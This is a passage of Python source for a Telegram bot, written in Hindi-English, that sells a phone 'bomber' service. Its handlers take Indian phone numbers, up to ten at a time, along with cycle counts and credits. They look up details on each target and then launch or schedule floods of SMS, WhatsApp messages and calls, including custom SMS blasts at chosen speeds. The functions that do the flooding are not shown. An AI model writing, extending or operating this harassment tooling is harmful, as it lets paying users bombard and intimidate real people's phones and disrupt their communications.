        await msg.answer(f"❌ Number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"😴 No API!", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


# ================= STOP SEND =================
@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Koi active sending nahi!", show_alert=True); return
        session.cancelled = True
    await cq.answer("🛑 Stopping...", show_alert=True)
# =====================================================================
# PART 6 (FINAL) — Classic Bomb UI, Schedule, Recurring, Multi-Bomb,
#                 Maintenance, Contest, Firebase Monitor, Backup, Videos,
#                 Firebase Menu, Admin Panels, Pricing, Redeem, Settings,
#                 User Info, Refer, Stats, Transfer, main()
# =====================================================================
# ⚠️ Isko PART 5 ke turant baad paste karo — YAHI LAST PART HAI
# =====================================================================


# ================= CLASSIC BOMB UI =================
@R.callback_query(F.data == "user:classic_bomb")
async def user_classic_bomb_start(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True); return
    deduct = should_deduct_credits(uid, d)
    if deduct:
        credits = get_user_credits(uid, d)
        if credits < CREDITS_PER_CYCLE:
            await cq.answer(f"❌ Min {CREDITS_PER_CYCLE} credits needed!", show_alert=True); return
        info = f"💰 Credits: {credits}"
    else:
        if has_active_validity(uid, d):
            v = get_validity_info(uid, d)
            info = f"🎫 Valid: {v['plan_name']} ({v['days_left']}d) — No credits needed!"
        else:
            info = "💰 Admin/Owner: No credits needed"
    await state.set_state(S.classic_bomb_number)
    try:
        await cq.message.edit_text(
            f"💥 *CLASSIC BOMB*\n{info}\n"
            f"⏱️ {CREDITS_PER_CYCLE} credits = 1 cycle = {BOMB_DURATION_MINUTES} min\n"
            f"🕐 IST: `{ist_time_str()}`\n\nSend 10-digit number:",
            parse_mode="Markdown",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]))
    except: pass
    await cq.answer()


@R.callback_query(F.data == "owner:classic_bomb")
async def owner_classic_bomb_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.classic_bomb_number)
    try:
        await cq.message.edit_text(
            f"💥 *CLASSIC BOMB (OWNER)*\n🕐 IST: `{ist_time_str()}`\n\nSend 10-digit number:",
            parse_mode="Markdown", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]))
    except: pass
    await cq.answer()


@R.callback_query(F.data == "admin:classic_bomb")
async def admin_classic_bomb_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.classic_bomb_number)
    try:
        await cq.message.edit_text(
            f"💥 *CLASSIC BOMB (ADMIN)*\n🕐 IST: `{ist_time_str()}`\n\nSend 10-digit number:",
            parse_mode="Markdown", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]))
    except: pass
    await cq.answer()


@R.message(S.classic_bomb_number)
async def classic_bomb_number_received(msg: Message, state: FSMContext):
    user_id = msg.from_user.id
    raw = msg.text.strip()
    phone = extract_indian_number(raw)

    if not phone:
        await msg.reply(
            f"❌ *Invalid number!*\n\n"
            f"Aapne bheja: `{raw[:30]}`\n\n"
            f"*Valid formats:*\n"
            f"• `9876543210`\n"
            f"• `+919876543210`\n"
            f"• `+91 98765 43210`\n"
            f"• `09876543210`\n\n"
            f"Dobara bhejo:",
            parse_mode="Markdown"
        )
        return

    loading_msg = await msg.reply(
        f"🔍 *Number check kar raha hoon...*\n\n"
        f"📞 `{mask_number(phone)}`\n"
        f"_Please wait..._",
        parse_mode="Markdown"
    )

    info = await fetch_number_info(phone)

    try:
        await loading_msg.delete()
    except:
        pass

    if not info:
        d = load()
        deduct = should_deduct_credits(user_id, d)
        await state.update_data(classic_phone=phone)
        await state.set_state(S.classic_bomb_credits)
        if not deduct:
            if has_active_validity(user_id, d):
                v = get_validity_info(user_id, d)
                await msg.reply(
                    f"✅ `{phone}`\n\n🎫 *Valid: `{v['plan_name']}`*\n"
                    f"📅 Days left: `{v['days_left']}`\n✅ *No credits needed!*\n\n"
                    f"🔁 Kitne cycles? (1 cycle = 10 min)",
                    parse_mode="Markdown")
            else:
                await msg.reply(
                    f"✅ `{phone}`\n\n💰 Admin/Owner: No credits needed\n\n"
                    f"🔁 Kitne cycles? (1 cycle = 10 min)",
                    parse_mode="Markdown")
        else:
            credits = get_user_credits(user_id, d)
            max_cy = credits // CREDITS_PER_CYCLE
            await msg.reply(
                f"✅ `{phone}`\n\n💰 Credits: `{credits}`\n📊 Max cycles: `{max_cy}`\n"
                f"({CREDITS_PER_CYCLE} credits = 1 cycle)\n\n"
                f"💡 *Validity lo → credits free!*\n\nKitne credits?",
                parse_mode="Markdown")
        return

    await state.update_data(classic_phone=phone, num_info_shown_at=time.time())
    await state.set_state(S.classic_bomb_number)

    info_msg = await msg.reply(
        format_number_info(phone, info),
        reply_markup=classic_num_info_kb(phone),
        parse_mode="Markdown"
    )

    asyncio.create_task(auto_delete_num_info(msg.bot, msg.chat.id, info_msg.message_id, NUM_INFO_AUTO_DELETE_SECONDS))


@R.message(S.classic_bomb_credits)
async def classic_bomb_credits_received(msg: Message, state: FSMContext):
    user_id = msg.from_user.id
    d = load()
    fsmd = await state.get_data()
    phone = fsmd.get("classic_phone", "")
    deduct = should_deduct_credits(user_id, d)
    try:
        entered = int(msg.text.strip())
        if entered <= 0: raise ValueError
    except:
        await msg.reply("❌ Valid number bhejo.", parse_mode="Markdown"); return
    if not deduct:
        cycles = entered
        credits_to_use = 0
        if has_active_validity(user_id, d):
            v = get_validity_info(user_id, d)
            credit_msg = f"🎫 Valid: `{v['plan_name']}` — No deduction ✅"
        else:
            credit_msg = "💰 Admin/Owner: No deduction"
    else:
        credits = get_user_credits(user_id, d)
        max_credits = (credits // CREDITS_PER_CYCLE) * CREDITS_PER_CYCLE
        if entered < CREDITS_PER_CYCLE:
            await msg.reply(f"❌ Min {CREDITS_PER_CYCLE} credits.", parse_mode="Markdown"); return
        if entered > max_credits:
            await msg.reply(f"❌ Max `{max_credits}` credits.", parse_mode="Markdown"); return
        credits_to_use = (entered // CREDITS_PER_CYCLE) * CREDITS_PER_CYCLE
        cycles = credits_to_use // CREDITS_PER_CYCLE
        deduct_credits(user_id, credits_to_use, d)
        save(d)
        credit_msg = f"💰 Used: `{credits_to_use}` | Left: `{get_user_credits(user_id, d)}`"
    await state.clear()
    if not phone:
        await msg.reply("❌ Error!", parse_mode="Markdown"); return
    active_classic_bombings[user_id] = True
    classic_bombing_stats[user_id] = {'sms': 0, 'wa': 0, 'calls': 0}
    await msg.reply(
        f"💥 *STARTED!*\n📱 `{phone}`\n🔁 `{cycles}` cycles\n"
        f"⏱️ `{cycles * BOMB_DURATION_MINUTES}` min\n{credit_msg}\n🕐 IST: `{ist_time_str()}`",
        parse_mode="Markdown")
    pass_credits = credits_to_use if deduct else 0
    asyncio.create_task(run_classic_bombing(msg.bot, msg.chat.id, user_id, phone, cycles, pass_credits))


# ================= MULTI-NUMBER BOMB UI =================
@R.callback_query(F.data.in_({"owner:multi_bomb", "admin:multi_bomb", "user:multi_bomb"}))
async def multi_bomb_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True); return
    if not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True); return
    if is_owner(uid, d): back = "owner:home"
    elif is_admin(uid, d): back = "admin:home"
    else: back = "user:home"
    await state.set_state(S.multi_target_numbers)
    try:
        await cq.message.edit_text(
            f"🎯 <b>MULTI-NUMBER BOMB</b>\n🕐 IST: <code>{ist_time_str()}</code>\n\n"
            f"<b>Step 1/2:</b> Multiple numbers (comma/space)\n\n"
            f"<b>Example:</b>\n<code>6201762242, 9876543210, 9123456789</code>\n\n"
            f"<i>Max 10</i>",
            reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")
    except: pass


@R.message(S.multi_target_numbers)
async def multi_bomb_get_numbers(msg: Message, state: FSMContext):
    raw_parts = re.split(r'[,\s\n]+', msg.text.strip())
    numbers = []
    for part in raw_parts:
        parsed = extract_indian_number(part)
        if parsed and parsed not in numbers:
            numbers.append(parsed)

    if not numbers:
        await msg.reply(
            "❌ Koi valid number nahi mila.\n\n"
            "*Valid formats:*\n"
            "• `9876543210`\n"
            "• `+919876543210`\n"
            "• `+91 98765 43210`",
            parse_mode="Markdown"
        )
        return

    if len(numbers) > 10:
        await msg.reply(f"❌ Max 10. Aapne {len(numbers)}.", parse_mode="Markdown"); return

    await state.update_data(mn_numbers=numbers)
    await state.set_state(S.multi_target_type)
    d = load()
    uid = msg.from_user.id
    deduct = should_deduct_credits(uid, d)
    if deduct:
        credits = get_user_credits(uid, d)
        info = f"💰 Credits: `{credits}`\n💵 Per cycle: `{CREDITS_PER_CYCLE} per number`"
    else:
        if has_active_validity(uid, d):
            v = get_validity_info(uid, d)
            info = f"🎫 *VALIDITY: `{v['plan_name']}`*\n✅ *No credit deduction!*"
        else:
            info = "💰 Admin/Owner: No deduction"
    await msg.reply(
        f"✅ *{len(numbers)} numbers detected:*\n{', '.join(f'`{n}`' for n in numbers)}\n\n"
        f"{info}\n\n<b>Kaunsa bomb chalana hai?</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "multi:type:classic", EMOJI_FIRE, "💥")],
            [btn("📤 ᴄᴜsᴛᴏᴍ sᴍs", "multi:type:custom", EMOJI_ROCKET, "📤")],
            [btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌")]
        ]),
        parse_mode="Markdown")


@R.callback_query(F.data == "multi:type:classic")
async def multi_classic_type(cq: CallbackQuery, state: FSMContext):
    await state.update_data(mn_type="classic")
    await state.set_state(S.multi_target_count)
    try:
        await cq.message.edit_text(
            f"💥 <b>CLASSIC MULTI-BOMB</b>\n\n<b>Kitne cycles per number?</b>\n<i>1 cycle = 10 min</i>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "multi:type:custom")
async def multi_custom_type(cq: CallbackQuery, state: FSMContext):
    await state.update_data(mn_type="custom_sms")
    await state.set_state(S.user_schedule_custom_message)
    try:
        await cq.message.edit_text(
            f"📤 <b>CUSTOM SMS MULTI-BOMB</b>\n\n<b>Message bhejo:</b>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.message(S.multi_target_count)
async def multi_bomb_execute(msg: Message, state: FSMContext):
    try:
        cycles = int(msg.text.strip())
        if cycles < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    numbers = fsmd.get("mn_numbers", [])
    uid = msg.from_user.id
    d = load()
    deduct = should_deduct_credits(uid, d)
    if deduct:
        total_needed = len(numbers) * cycles * CREDITS_PER_CYCLE
        have = get_user_credits(uid, d)
        if have < total_needed:
            await state.clear()
            await msg.reply(f"❌ *Insufficient credits!*\n\nRequired: `{total_needed}`\nYou have: `{have}`",
                parse_mode="Markdown")
            return
        deduct_credits(uid, total_needed, d)
        save(d)
        credit_msg = f"💰 Deducted: `{total_needed}`"
    else:
        credit_msg = f"🎫 Valid: `{get_validity_info(uid, d)['plan_name']}` — No deduction ✅" if has_active_validity(uid, d) else "💰 Admin/Owner"
    await state.clear()
    active_classic_bombings[uid] = True
    classic_bombing_stats[uid] = {'sms': 0, 'wa': 0, 'calls': 0}
    await msg.reply(
        f"🎯 *MULTI-NUMBER BOMB STARTED!*\n📊 Numbers: `{len(numbers)}`\n"
        f"🔁 Cycles: `{cycles}` each\n{credit_msg}",
        parse_mode="Markdown")
    pass_credits = CREDITS_PER_CYCLE if deduct else 0
    asyncio.create_task(multi_number_bombing(msg.bot, msg.chat.id, uid, numbers, cycles, pass_credits))


# ================= USER SCHEDULE BOMB =================
@R.callback_query(F.data == "user:schedule_bomb")
async def user_schedule_bomb_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True); return
    if not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True); return
    deduct = should_deduct_credits(uid, d)
    if deduct:
        credits = get_user_credits(uid, d)
        info = f"💰 Credits: <b>{credits}</b>\n💵 Per cycle: <b>{CREDITS_PER_CYCLE} credits</b>"
    else:
        if has_active_validity(uid, d):
            v = get_validity_info(uid, d)
            info = f"🎫 <b>{v['plan_name']}</b> • {v['days_left']}d — <b>No credits!</b> ✅"
        else:
            info = "💰 Admin/Owner: No credits needed"
    await state.set_state(S.user_schedule_bomb_type)
    try:
        await cq.message.edit_text(
            f"⏰ <b>SCHEDULE BOMB</b>\n"
            f"🕐 IST: <code>{ist_time_str()}</code>\n"
            f"{info}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>Kaunsa bomb schedule karna hai?</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📤 ᴄᴜsᴛᴏᴍ sᴍs", "user_schedule:type:custom", EMOJI_ROCKET, "📤")],
                [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "user_schedule:type:classic", EMOJI_FIRE, "💥")],
                [btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌")]
            ]),
            parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user_schedule:type:custom")
async def user_schedule_choose_custom(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="custom_sms")
    await state.set_state(S.user_schedule_custom_number)
    try:
        await cq.message.edit_text(
            f"📤 <b>CUSTOM SMS SCHEDULE</b>\n\n"
            f"<b>Step 1/5:</b> Phone number bhejo (10 digit)\n<i>Example: 6201762242</i>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "user_schedule:type:classic")
async def user_schedule_choose_classic(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="classic")
    await state.set_state(S.user_schedule_bomb_number)
    try:
        await cq.message.edit_text(
            f"💥 <b>CLASSIC BOMB SCHEDULE</b>\n\n"
            f"<b>Step 1/3:</b> Phone number bhejo (10 digit)\n<i>Example: 6201762242</i>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.message(S.user_schedule_bomb_number)
async def user_schedule_bomb_get_number(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid! Valid Indian number bhejo.", parse_mode="Markdown"); return
    await state.update_data(sb_phone=phone)
    await state.set_state(S.user_schedule_bomb_time)
    await msg.reply(
        f"✅ Number: `{phone}`\n\n"
        f"⏰ *Step 2/3: Kis time pe start karna hai?*\nFormat: `HH:MM` (24-hour, IST)\n\n"
        f"<b>Examples:</b>\n• `14:30` → 2:30 PM IST\n• `20:00` → 8:00 PM IST\n\n"
        f"🕐 Current IST: `{ist_time_str()}`",
        parse_mode="Markdown")


@R.message(S.user_schedule_bomb_time)
async def user_schedule_bomb_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        target_hour = int(parts[0]); target_min = int(parts[1])
        if target_hour < 0 or target_hour > 23 or target_min < 0 or target_min > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid time!", parse_mode="Markdown"); return
    now_ist = ist_now()
    target_ist = now_ist.replace(hour=target_hour, minute=target_min, second=0, microsecond=0)
    if target_ist <= now_ist:
        target_ist = target_ist + timedelta(days=1)
        is_tomorrow = True
    else:
        is_tomorrow = False
    delay_seconds = int((target_ist - now_ist).total_seconds())
    if delay_seconds < 30:
        await msg.reply("⚠️ Min 30 second baad.", parse_mode="Markdown"); return
    await state.update_data(sb_delay_seconds=delay_seconds, sb_target_hour=target_hour,
                            sb_target_min=target_min, sb_is_tomorrow=is_tomorrow)
    await state.set_state(S.user_schedule_bomb_cycles)
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    hrs = delay_seconds // 3600; mins = (delay_seconds % 3600) // 60
    delay_str = f"{hrs}h {mins}m" if hrs > 0 else f"{mins}m"
    await msg.reply(
        f"✅ *Time set:* `{target_hour:02d}:{target_min:02d}` IST{tomorrow_str}\n"
        f"⏳ *Starts in:* `{delay_str}`\n\n"
        f"⏰ *Step 3/3: Kitne cycles?*\n<i>1 cycle = 10 minutes</i>",
        parse_mode="Markdown")


@R.message(S.user_schedule_bomb_cycles)
async def user_schedule_bomb_get_cycles(msg: Message, state: FSMContext):
    try:
        cycles = int(msg.text.strip())
        if cycles < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number bhejo (1 ya zyada).", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("sb_phone")
    delay_seconds = fsmd.get("sb_delay_seconds")
    target_hour = fsmd.get("sb_target_hour")
    target_min = fsmd.get("sb_target_min")
    is_tomorrow = fsmd.get("sb_is_tomorrow", False)
    uid = msg.from_user.id
    d = load()
    deduct = should_deduct_credits(uid, d)
    credit_msg = ""
    if deduct:
        total_needed = cycles * CREDITS_PER_CYCLE
        have = get_user_credits(uid, d)
        if have < total_needed:
            await state.clear()
            await msg.reply(f"❌ *Insufficient credits!*\n\nRequired: `{total_needed}`\nYou have: `{have}`\n\n"
                f"💡 *Validity lo → Credits free!*", parse_mode="Markdown")
            return
        deduct_credits(uid, total_needed, d)
        save(d)
        credit_msg = f"💰 Deducted: `{total_needed}` | Left: `{get_user_credits(uid, d)}`"
    else:
        if has_active_validity(uid, d):
            credit_msg = f"🎫 Valid: `{get_validity_info(uid, d)['plan_name']}` — No deduction ✅"
        else:
            credit_msg = "💰 Admin/Owner: No deduction"
    sid = str(int(time.time())) + str(random.randint(100, 999))
    run_at = time.time() + delay_seconds
    scheduled_bombs[sid] = {
        "user_id": uid, "bomb_type": "classic", "phone": phone, "cycles": cycles,
        "run_at": run_at, "created_at": time.time(), "running": False
    }
    d["scheduled_bombs"] = scheduled_bombs
    save(d)
    await state.clear()
    start_ist = ist_from_timestamp(int(run_at), "%d/%m/%Y %I:%M:%S %p")
    now_ist = ist_str("%I:%M:%S %p")
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(
        f"✅ *CLASSIC BOMB SCHEDULED!*\n━━━━━━━━━━━━━━━\n"
        f"💥 Type: Classic Bomb\n📱 Target: `{phone}`\n"
        f"🕐 *Start:* `{target_hour:02d}:{target_min:02d}`{tomorrow_str}\n"
        f"📅 Full: `{start_ist}`\n🔁 Cycles: `{cycles}`\n🕒 IST: `{now_ist}`\n"
        f"{credit_msg}\n━━━━━━━━━━━━━━━\n\n💡 Auto-start! /stop se cancel",
        parse_mode="Markdown")


@R.message(S.user_schedule_custom_number)
async def user_schedule_custom_get_number(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid! Valid Indian number.", parse_mode="Markdown"); return
    await state.update_data(sc_phone=phone)
    await state.set_state(S.user_schedule_custom_time)
    await msg.reply(f"✅ Number: `{phone}`\n\n⏰ *Step 2/5: Kis time pe start karna hai?*\nFormat: `HH:MM` IST",
        parse_mode="Markdown")


@R.message(S.user_schedule_custom_time)
async def user_schedule_custom_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        target_hour = int(parts[0]); target_min = int(parts[1])
        if target_hour < 0 or target_hour > 23 or target_min < 0 or target_min > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid time!", parse_mode="Markdown"); return
    now_ist = ist_now()
    target_ist = now_ist.replace(hour=target_hour, minute=target_min, second=0, microsecond=0)
    if target_ist <= now_ist:
        target_ist = target_ist + timedelta(days=1)
        is_tomorrow = True
    else:
        is_tomorrow = False
    delay_seconds = int((target_ist - now_ist).total_seconds())
    if delay_seconds < 30:
        await msg.reply("⚠️ Min 30 second baad.", parse_mode="Markdown"); return
    await state.update_data(sc_delay=delay_seconds, sc_hour=target_hour,
                            sc_min=target_min, sc_tomorrow=is_tomorrow)
    await state.set_state(S.user_schedule_custom_message)
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(f"✅ Time: `{target_hour:02d}:{target_min:02d}` IST{tomorrow_str}\n\n"
        f"💬 *Step 3/5: Message bhejo*\nJo SMS bhejna hai woh type karo:", parse_mode="Markdown")


@R.message(S.user_schedule_custom_message)
async def user_schedule_custom_get_message(msg: Message, state: FSMContext):
    message_text = msg.text.strip()
    if not message_text:
        await msg.reply("❌ Message empty!", parse_mode="Markdown"); return
    await state.update_data(sc_message=message_text)
    await state.set_state(S.user_schedule_custom_speed)
    await msg.reply(f"✅ Message saved!\n\n⚡ *Step 4/5: Speed choose karo*",
        reply_markup=speed_kb("schedule"), parse_mode="Markdown")


@R.callback_query(F.data.in_({"schedule:speed:fast", "schedule:speed:medium", "schedule:speed:slow"}))
async def user_schedule_custom_get_speed(cq: CallbackQuery, state: FSMContext):
    speed_map = {"schedule:speed:fast": SPEED_FAST, "schedule:speed:medium": SPEED_MEDIUM, "schedule:speed:slow": SPEED_SLOW}
    selected = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected == SPEED_FAST else "⚡ MEDIUM" if selected == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(sc_speed=selected)
    await state.set_state(S.user_schedule_custom_count)
    try:
        await cq.message.edit_text(
            f"{speed_label} <b>selected!</b>\n\n🔢 *Step 5/5: Kitne SMS bhejna hai?*\n<i>Example: 50</i>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
            parse_mode="HTML")
    except: pass


@R.message(S.user_schedule_custom_count)
async def user_schedule_custom_get_count(msg: Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number bhejo.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("sc_phone")
    delay = fsmd.get("sc_delay")
    target_hour = fsmd.get("sc_hour")
    target_min = fsmd.get("sc_min")
    is_tomorrow = fsmd.get("sc_tomorrow", False)
    message_text = fsmd.get("sc_message")
    speed = fsmd.get("sc_speed", SPEED_DEFAULT)
    uid = msg.from_user.id
    d = load()
    deduct = should_deduct_credits(uid, d)
    credit_msg = ""
    if deduct:
        have = get_user_credits(uid, d)
        if have < count:
            await state.clear()
            await msg.reply(f"❌ *Insufficient credits!*\nRequired: `{count}`\nYou have: `{have}`", parse_mode="Markdown")
            return
        deduct_credits(uid, count, d)
        save(d)
        credit_msg = f"💰 Deducted: `{count}` | Left: `{get_user_credits(uid, d)}`"
    else:
        if has_active_validity(uid, d):
            credit_msg = f"🎫 Valid: `{get_validity_info(uid, d)['plan_name']}` — No deduction ✅"
        else:
            credit_msg = "💰 Admin/Owner: No deduction"
    sid = str(int(time.time())) + str(random.randint(100, 999))
    run_at = time.time() + delay
    scheduled_bombs[sid] = {
        "user_id": uid, "bomb_type": "custom_sms", "phone": phone,
        "message": message_text, "speed": speed, "count": count,
        "run_at": run_at, "created_at": time.time(), "running": False
    }
    d["scheduled_bombs"] = scheduled_bombs
    save(d)
    await state.clear()
    start_ist = ist_from_timestamp(int(run_at), "%d/%m/%Y %I:%M:%S %p")
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(
        f"✅ *CUSTOM SMS SCHEDULED!*\n━━━━━━━━━━━━━━━\n"
        f"📤 Type: Custom SMS\n📱 Target: `{phone}`\n"
        f"🕐 Start: `{target_hour:02d}:{target_min:02d}`{tomorrow_str}\n"
        f"📅 Full: `{start_ist}`\n💬 Message: `{message_text[:50]}`\n"
        f"⚡ Speed: `{speed}`\n🔢 Count: `{count}`\n"
        f"{credit_msg}\n━━━━━━━━━━━━━━━\n\n💡 Auto-start!",
        parse_mode="Markdown")


# ================= OWNER/ADMIN SCHEDULE =================
@R.callback_query(F.data.in_({"owner:schedule_bomb", "admin:schedule_bomb"}))
async def schedule_bomb_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.schedule_bomb_type)
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    try:
        await cq.message.edit_text(
            f"⏰ <b>SCHEDULE BOMB</b>\n"
            f"🕐 IST: <code>{ist_time_str()}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>Kaunsa bomb schedule karna hai?</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📤 ᴄᴜsᴛᴏᴍ sᴍs", "schedule:type:custom", EMOJI_ROCKET, "📤")],
                [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "schedule:type:classic", EMOJI_FIRE, "💥")],
                [btn("ᴄᴀɴᴄᴇʟ", back, EMOJI_CROSS, "❌")]
            ]),
            parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "schedule:type:custom")
async def schedule_choose_custom(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="custom_sms")
    await state.set_state(S.schedule_custom_number)
    try:
        await cq.message.edit_text(f"📤 <b>CUSTOM SMS SCHEDULE</b>\n\n<b>Step 1/5:</b> Phone number bhejo (10 digit)",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "schedule:type:classic")
async def schedule_choose_classic(cq: CallbackQuery, state: FSMContext):
    await state.update_data(bomb_type="classic")
    await state.set_state(S.schedule_bomb_number)
    try:
        await cq.message.edit_text(f"💥 <b>CLASSIC BOMB SCHEDULE</b>\n\n<b>Step 1/3:</b> Phone number bhejo (10 digit)",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.message(S.schedule_bomb_number)
async def schedule_bomb_get_number(msg: Message, state: FSMContext):
    phone = extract_indian_number(msg.text.strip())
    if not phone:
        await msg.reply("❌ Invalid number.", parse_mode="Markdown"); return
    await state.update_data(sb_phone=phone)
    await state.set_state(S.schedule_bomb_time)
    await msg.reply(f"✅ `{phone}`\n\n⏰ *Step 2/3: Time?*\nFormat: `HH:MM` (24-hour, IST)", parse_mode="Markdown")


@R.message(S.schedule_bomb_time)
async def schedule_bomb_get_time(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not re.match(r'^\d{1,2}:\d{2}$', text):
        await msg.reply("❌ Format: `HH:MM`", parse_mode="Markdown"); return
    try:
        parts = text.split(":")
        target_hour = int(parts[0]); target_min = int(parts[1])
        if target_hour < 0 or target_hour > 23 or target_min < 0 or target_min > 59:
            raise ValueError
    except:
        await msg.reply("❌ Invalid time!", parse_mode="Markdown"); return
    now_ist = ist_now()
    target_ist = now_ist.replace(hour=target_hour, minute=target_min, second=0, microsecond=0)
    if target_ist <= now_ist:
        target_ist = target_ist + timedelta(days=1)
        is_tomorrow = True
    else:
        is_tomorrow = False
    delay_seconds = int((target_ist - now_ist).total_seconds())
    if delay_seconds < 30:
        await msg.reply("⚠️ Min 30 second baad.", parse_mode="Markdown"); return
    await state.update_data(sb_delay_seconds=delay_seconds, sb_target_hour=target_hour,
                            sb_target_min=target_min, sb_is_tomorrow=is_tomorrow)
    await state.set_state(S.schedule_bomb_cycles)
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(f"✅ *Time set:* `{target_hour:02d}:{target_min:02d}` IST{tomorrow_str}\n\n"
        f"⏰ *Step 3/3: Cycles?*\n<i>1 cycle = 10 min</i>", parse_mode="Markdown")


@R.message(S.schedule_bomb_cycles)
async def schedule_bomb_get_cycles(msg: Message, state: FSMContext):
    try:
        cycles = int(msg.text.strip())
        if cycles < 1: raise ValueError
    except:
        await msg.reply("❌ Valid number.", parse_mode="Markdown"); return
    fsmd = await state.get_data()
    phone = fsmd.get("sb_phone"); delay_seconds = fsmd.get("sb_delay_seconds")
    target_hour = fsmd.get("sb_target_hour"); target_min = fsmd.get("sb_target_min")
    is_tomorrow = fsmd.get("sb_is_tomorrow", False)
    uid = msg.from_user.id
    d = load()
    sid = str(int(time.time())) + str(random.randint(100, 999))
    run_at = time.time() + delay_seconds
    scheduled_bombs[sid] = {"user_id": uid, "bomb_type": "classic", "phone": phone, "cycles": cycles,
                            "run_at": run_at, "created_at": time.time(), "running": False}
    d["scheduled_bombs"] = scheduled_bombs
    save(d)
    await state.clear()
    start_ist = ist_from_timestamp(int(run_at), "%d/%m/%Y %I:%M:%S %p")
    tomorrow_str = " (ᴋᴀʟ)" if is_tomorrow else ""
    await msg.reply(
        f"✅ *CLASSIC BOMB SCHEDULED!*\n━━━━━━━━━━━━━━━\n📱 `{phone}`\n"
        f"🕐 `{target_hour:02d}:{target_min:02d}`{tomorrow_str}\n"
        f"📅 `{start_ist}`\n🔁 `{cycles}` cycles",
        parse_mode="Markdown")


@R.message(S.schedule_custom_number)
